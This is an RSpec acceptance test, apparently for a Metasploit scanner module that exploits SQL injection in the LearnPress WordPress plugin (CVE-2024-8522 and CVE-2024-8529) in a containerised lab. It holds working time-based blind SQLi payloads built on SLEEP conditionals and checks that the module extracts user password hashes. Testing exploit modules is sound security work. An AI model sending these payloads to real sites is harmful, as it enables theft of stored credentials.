require 'acceptance_spec_helper'
require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'uri'

RSpec.describe 'LearnPress genuine SQLi targets', acceptance: true, order: :defined do
  include_context 'module target'

  before(:all) do
    @lp = { commands: [], requests: [], calls: [], reports: [], controls: [], priming: [], loot: [] }
    @release = ENV.fetch('LEARNPRESS_RELEASE', '4.2.7')
    @mode = ENV.fetch('LEARNPRESS_MODE', 'enabled')
    @prefix = ENV.fetch('LEARNPRESS_PREFIX', '')
    @vulnerable = @mode == 'enabled' && @release == '4.2.7'
    begin
      @baseline = lp_identity('before')
      expect(@baseline.values_at('core', 'php', 'uid', 'database', 'database_role')).to eq(['6.8.3', '8.3.28', 33, 'wp_root', 'module_target@%'])
      expect(@baseline.fetch('server')).to start_with('11.2.2-MariaDB')
      expect(@baseline.fetch('database_grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
      catalog = JSON.parse(File.read('test/module_targets/learnpress_fields/releases.json')).fetch(@release)
      installed = @mode != 'absent'
      active = @mode == 'enabled'
      expect(@baseline.values_at('installed', 'active', 'plugin_version')).to eq([installed, active, installed ? @release : nil])
      expect(@baseline.fetch('installed_sha256')).to eq(installed ? catalog.fetch('installed_sha256') : {})
      expect(@baseline.fetch('archive_sha256')).to eq(catalog.fetch('sha256'))
      expect(@baseline.fetch('active_plugins')).to eq(active ? ['learnpress/learnpress.php'] : [])
      expect(@baseline.fetch('tables_install_done')).to eq(active ? true : nil)
      expect(@baseline.fetch('courses').map { |row| row.fetch('post_title') }).to eq(active ? ['Module target native course'] : [])
      expect(@baseline.fetch('plugin_tables').empty?).to be(!active)
      expect(@baseline.values_at('prefix', 'permalink_structure')).to eq([@prefix, '/%postname%/'])
      expect(@baseline.fetch('users').map { |user| user.fetch('user_login') }).to eq(%w[module_admin module_author module_subscriber module_editor])
      expect(@baseline.fetch('users').all? { |user| user.fetch('user_pass').start_with?('$wp$2y$') }).to be(true)
      expect(@baseline.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
      if ENV['LEARNPRESS_PREFIX_SCOPE'] == '1'
        expect(@baseline.fetch('table_prefix')).to eq('wp_native_')
        tables = @baseline.fetch('visible_users_tables').map { |row| row.values_at('db_name', 'table_name') }
        expect(tables).to include(['wp_root', 'wp_native_users'], ['wp_prefix', 'wp_users'])
        expect(tables).not_to include(['wp_root', 'wp_users'])
        expect(@baseline.fetch('backup_users')).to eq(@baseline.fetch('users'))
      else
        expect(@baseline.fetch('table_prefix')).to eq('wp_')
      end
      lp_controls('before')
      lp_prime if ENV['LEARNPRESS_PRIME_CACHE'] == '1'
      expect(lp_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      expect(lp_sql('SELECT usesuper FROM pg_user WHERE usename=current_user').strip).to eq('f')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets')
      @workspace = "learnpress_target_#{Process.pid}"
      expect(console_command("workspace -a #{@workspace}")).to include(@workspace)
      expect(lp_reports).to eq([])
      output = console_command('irb -e \'puts "LEARNPRESS_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/scanner/http/wp_learnpress_c_fields_sqli.rb").hexdigest}.to_json\'')
      @lp[:provenance] = JSON.parse(output.match(/^LEARNPRESS_PROVENANCE=(.+)$/)[1])
      expect(@lp[:provenance].fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@lp[:provenance].fetch('owner_sha256')).to eq(Digest::SHA256.file('modules/auxiliary/scanner/http/wp_learnpress_c_fields_sqli.rb').hexdigest)
      @lp[:preflight] = 'passed'
    ensure
      lp_save
    end
  end

  after(:all) do
    if @lp&.key?(:preflight)
      lp_controls('after')
      lp_reports
      expect(lp_identity('after')).to eq(@baseline)
      expect(console_command('irb -e \'puts "LEARNPRESS_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('LEARNPRESS_STATE={"sessions":[],"jobs":[]}')
    end
  ensure
    lp_save
  end

  JSON.parse(ENV.fetch('LEARNPRESS_ACTIONS', '["CVE-2024-8522"]')).each do |action_name|
    Integer(ENV.fetch('LEARNPRESS_REPEATS', '1')).times do |iteration|
      it "verifies complete data or rejection for #{action_name} run #{iteration + 1}" do
        options = { 'ACTION' => action_name, 'SqliDelay' => 0.6, 'HttpClientTimeout' => 5, 'TARGETURI' => @prefix + '/', 'VHOST' => 'module-target.test', 'VERBOSE' => true }
        options['COUNT'] = Integer(ENV.fetch('LEARNPRESS_COUNT')) if ENV.key?('LEARNPRESS_COUNT')
        @lp.fetch(:calls) << { action: 'run', options: options, state: 'started' }
        lp_save
        started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
        output = run_target_module('auxiliary/scanner/http/wp_learnpress_c_fields_sqli', 'app', options, allow_errors: true, command_timeout: 540)
        @lp.fetch(:calls).last.merge!(state: 'returned', seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started, output_base64: Base64.strict_encode64(output.b))
        lp_save
        expect(output).not_to match(/Unknown datastore option|Connection failed|Exception|NoMethodError/)
        rows = lp_reports
        if @vulnerable
          expect(output).not_to match(/Auxiliary (?:failed|aborted)/)
          expect(output).to include('Target is vulnerable to SQLi!', 'Loot saved to:')
          expect(rows.length).to eq(Integer(ENV.fetch('LEARNPRESS_COUNT', '1')))
          expect(rows.map { |row| row.fetch('username') }.uniq.length).to eq(rows.length)
          native = @baseline.fetch('users').to_h { |user| user.values_at('user_login', 'user_pass') }
          rows.each do |row|
            expect(row.fetch('private_data')).to eq(native.fetch(row.fetch('username')))
            expect(row.values_at('type', 'origin_type', 'module_full_name', 'proto', 'address', 'port')).to eq(['Metasploit::Credential::NonreplayableHash', 'Metasploit::Credential::Origin::Service', 'auxiliary/scanner/http/wp_learnpress_c_fields_sqli', 'tcp', target_endpoint('app').fetch('host'), target_endpoint('app').fetch('port')])
          end
          path = output.match(/Loot saved to: (.+)$/)[1].strip
          expect(File.expand_path(path)).to start_with(File.expand_path(ENV.fetch('MSF_CFGROOT_CONFIG')) + '/')
          expected = rows.map { |row| "Username: #{row.fetch('username')}, Password Hash: #{row.fetch('private_data')}\n".b }
          expect(File.binread(path).lines.sort).to eq(expected.sort)
          @lp.fetch(:loot) << { path: path, bytes: File.size(path), sha256: Digest::SHA256.file(path).hexdigest, complete_native_rows: rows.length }
        else
          expect(output).to include('Target is not vulnerable.')
          expect(output).not_to include('Target is vulnerable to SQLi!', 'Loot saved to:')
          expect(rows).to eq([])
        end
        lp_save
      ensure
        @lp.fetch(:calls).last[:console_base64] = Base64.strict_encode64(console.all_data.b) unless @lp.fetch(:calls).empty?
        lp_save
      end
    end
  end

  def lp_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-learnpress-fields.json'), JSON.pretty_generate(@lp)) if @lp
  end

  def lp_command(label, role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '30', *arguments]
    output, error, status = Open3.capture3(*argv)
    @lp.fetch(:commands) << { label: label, argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exit: status.exitstatus }
    lp_save
    raise "Native LearnPress command failed: #{label}: #{error}" unless status.success?

    output
  end

  def lp_identity(label)
    JSON.parse(lp_command(label, 'app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def lp_http(label, path)
    request = Net::HTTP::Get.new(path)
    request['Host'] = 'module-target.test'
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    http.max_retries = 0
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    response = http.request(request)
    elapsed = Process.clock_gettime(Process::CLOCK_MONOTONIC) - started
    @lp.fetch(:requests) << { label: label, path: request.path, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b), seconds: elapsed }
    lp_save
    [response, elapsed]
  end

  def lp_request(action_name, label, payload = nil)
    only_fields = action_name == 'CVE-2024-8522'
    parameters = {}
    parameters[only_fields ? 'c_only_fields' : 'c_fields'] = payload if payload
    parameters['return_type'] = 'json' unless only_fields
    parameters['rest_route'] = '/learnpress/v1/courses' if only_fields
    path = only_fields ? '/learnpress/v1/courses' : '/wp-json/lp/v1/courses/archive-course'
    lp_http(label, @prefix + path + '?' + URI.encode_www_form(parameters))
  end

  def lp_controls(phase)
    response, = lp_http(phase + '-login', @prefix + '/wp-login.php')
    expect(response.code).to eq('200')
    expect(response.body).to include('name="log"', 'name="pwd"', 'wp-submit')
    timings = {}
    %w[CVE-2024-8522 CVE-2024-8529].each_with_index do |action_name, action_number|
      response, = lp_request(action_name, phase + action_name + '-ordinary')
      code = @mode == 'enabled' ? '200' : '404'
      expect(response.code).to eq(code)
      expect(response.body).to include('Module target native course') if @mode == 'enabled'
      indicator = (phase == 'before' ? 5021 : 5023) + action_number * 1000
      values = {}
      %w[false true].each do |truth|
        condition = truth == 'true' ? "#{indicator}=#{indicator}" : "#{indicator}=#{indicator + 1}"
        response, values[truth] = lp_request(action_name, phase + action_name + truth, 'IF(' + condition + ',SLEEP(0.8),0)')
        expect(response.code).to eq(code)
      end
      if @vulnerable
        expect(values.fetch('true')).to be >= 0.65
        expect(values.fetch('true') - values.fetch('false')).to be >= 0.5
      else
        expect(values.values.max).to be < 0.5
        expect((values.fetch('true') - values.fetch('false')).abs).to be < 0.3
      end
      timings[action_name] = values
    end
    %w[app db reporting_db].each do |role|
      %w[memory.events pids.events].each do |key|
        text = lp_command(phase + role + key, role, 'cat', '/sys/fs/cgroup/' + key)
        values = text.lines.to_h do |line|
          name, value = line.split
          [name, Integer(value)]
        end
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if key == 'memory.events'
        expect(values.fetch('max')).to eq(0) if key == 'pids.events'
      end
    end
    @lp.fetch(:controls) << { phase: phase, timings: timings, status: 'passed' }
    lp_save
  end

  def lp_prime
    # Populate the real application cache across the original callback's entire
    # two-digit nonce space. No module randomness or transport is replaced.
    (0..99).each do |number|
      payload = "IF(COUNT(*)!=#{-number},(if(1=1,sleep(0.4),0)),0)"
      _, elapsed = lp_request('CVE-2024-8522', "prime-#{number}", payload)
      expect(elapsed).to be >= 0.35
    end
    [0, 50, 99].each do |number|
      payload = "IF(COUNT(*)!=#{-number},(if(1=1,sleep(0.4),0)),0)"
      _, elapsed = lp_request('CVE-2024-8522', "cached-repeat-#{number}", payload)
      expect(elapsed).to be < 0.35
    end
    @lp.fetch(:priming) << { entries: 100, cached_rechecks: 3, status: 'passed' }
    lp_save
  end

  def lp_sql(query)
    lp_command('sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def lp_reports
    raise 'Invalid diagnostic workspace' unless @workspace.match?(/\Alearnpress_target_[0-9]+\z/)

    rows = JSON.parse(lp_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.username),'[]'::json) FROM (
        SELECT p.username,s.data AS private_data,s.type,s.jtr_format,c.origin_type,o.module_full_name,
          service.name AS service,service.port,service.proto,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id LEFT JOIN metasploit_credential_privates s ON s.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services service ON service.id=o.service_id LEFT JOIN hosts h ON h.id=service.host_id
        WHERE w.name='#{@workspace}'
      ) row
    SQL
    @lp.fetch(:reports) << { workspace: @workspace, rows: rows }
    lp_save
    rows
  end
end
